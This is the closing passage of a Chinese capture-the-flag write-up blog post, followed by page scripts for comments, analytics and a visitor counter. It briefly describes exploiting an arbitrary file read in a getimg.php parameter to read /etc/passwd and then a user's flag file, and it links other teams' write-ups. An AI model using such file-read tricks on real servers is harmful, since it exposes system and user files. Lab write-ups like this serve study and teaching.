查看到可疑请求 —-<a href="http://118.31.18.64:20008/c181948a9bdee64753468823ac57a870/github.com/getimg.php?pic=xxx.png">http://118.31.18.64:20008/c181948a9bdee64753468823ac57a870/github.com/getimg.php?pic=xxx.png</a>
随后跟进测试发现此php可以实现任意文件读取
读取 /etc/passwd后发现flag用户
最后读取此用户home目录下的flag</p>

<hr />

<h5 id="表哥们的wp">表哥们的wp</h5>
<p>Kap0k : <a href="http://www.kap0k.com/archives/948">http://www.kap0k.com/archives/948</a>
浩子哥哥 : <a href="https://mp.weixin.qq.com/s/XBBx0rWZu9bAwt62F6Ai8g">https://mp.weixin.qq.com/s/XBBx0rWZu9bAwt62F6Ai8g</a>
并且宣传一波浩子哥哥的公众号 : HenceTech</p>

  </article>

	<p class="feed-recomendation">
		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
	</p>

  <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'pr0ph3t';
    var disqus_config = function () {
        this.page.identifier = "/posts/WHCTF-Web%E8%AF%A6%E7%BB%86%E5%A4%8D%E7%8E%B0-%E4%BC%AA-WP/";
    };
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      Thx!
    </footer>
  </div>
</div>
<script src="//code.jquery.com/jquery-3.3.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function() {
	$("img").each(function() {
		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
		$(this).wrapAll(strA);
    });
});
</script>
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-87275583-1', 'auto');
    ga('send', 'pageview');

</script>

  <script src="https://code.jquery.com/jquery-3.2.0.min.js"></script>
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>
    AV.initialize("FUf6n3OvGTkv0cqnGGbJyS5Q-MdYXbMMI", "FV3i9cojG6DyOMel86rUaaqR");
    AV.useAVCloudUS();
    //新增访问次数
    function addCount(Counter) {
      // 页面（博客文章）中的信息：leancloud_visitors
      // id为page.url， data-flag-title为page.title
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // 只根据文章的url查询LeanCloud服务器中的数据
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("visited_times");// 将点击次数加1
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                var newTimes = counter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            // 执行这里，说明LeanCloud中还没有记录此文章
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("post_title", title);// 把文章标题
            newcounter.set("post_url", url); // 文章url
            newcounter.set("visited_times", 1); // 初始点击次数：1次
            newcounter.save(null, { // 上传到LeanCloud服务器中
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                var newTimes = newcounter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //仅根据url和title查出当前访问次数，不做+1操作
    function showCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // 只根据文章的url查询LeanCloud服务器中的数据
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
            var counter = results[0];
            var $element = $(document.getElementById(url));
            var newTimes = counter.get('visited_times');
            $element.find('.leancloud-visitors-count').text(newTimes);
          } else {
            //如果表里没查到记录，那就是异常情况了
            console.log('异常情况，不应该没记录的');
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //调用API获取IP
    function getVisitorIpAndJudge() {
      var ip;
      var options = {
        type: 'GET',
        url: "https://ctf.pr0ph3t.com/"
      };
      $.ajax(options)
      .done(function(data, textStatus, jqXHR) {
        if(textStatus == "success") {
          ip = data.trim().split('<br>')[0];
        }
        judgeVisitor(ip)
      });
    }

    //判断访客是否已访问过该文章，及访问时间，符合条件则增加一次访问次数
    function judgeVisitor(ip) {
      var Counter = AV.Object.extend("visited_times");
      var Visitor = AV.Object.extend("visitors_record");

      var $postInfo = $(".leancloud_visitors");
      var post_url = $postInfo.attr('id').trim();

      var query = new AV.Query(Visitor);

      query.equalTo("visitor_ip", ip);
      query.equalTo("post_url", post_url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            console.log('该IP已访问过该文章');

            var oldVisitor = results[0];

            var lastTime = oldVisitor.updatedAt;
            var curTime = new Date();

            var timePassed = curTime.getTime() - lastTime.getTime();

            if(timePassed > 1 * 60 * 1000) {
              console.log('距离该IP上一次访问该文章已超过了1分钟，更新访问记录，并增加访问次数');

              addCount(Counter);

              oldVisitor.fetchWhenSave(true);
              oldVisitor.save(null, {
                success: function(oldVisitor) { },
                error: function(oldVisitor, error) {
                  console.log('Failed to save visitor record, with error message: ' + error.message);
                }
              });
            } else {
              console.log('这是该IP 1分钟内重复访问该文章，不更新访问记录，不增加访问次数');
              showCount(Counter);
            }
          } else {
            console.log('该IP第一次访问该文章，保存新的访问记录，并增加访问次数');

            addCount(Counter);

            var newVisitor = new Visitor();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newVisitor.setACL(acl);
            newVisitor.set("visitor_ip", ip);
            newVisitor.set("post_url", post_url);
            newVisitor.save(null, { // 上传到LeanCloud服务器中
              success: function(newVisitor) { },
              error: function(newVisitor, error) {
                console.log('Failed to create visitor record, with error message: ' + error.message);
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
          addCount(Counter);
        }
      });
    }

    $(function() {
      if ($('.leancloud_visitors').length == 1) {
        // 文章页面，调用判断方法，对符合条件的访问增加访问次数
        getVisitorIpAndJudge();
      } else if ($('.post-link').length > 1){
        // 首页 暂未使用
        // showHitCount(Counter);
      }
    });
  </script>

<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->

      </div>
    </body>
</html>
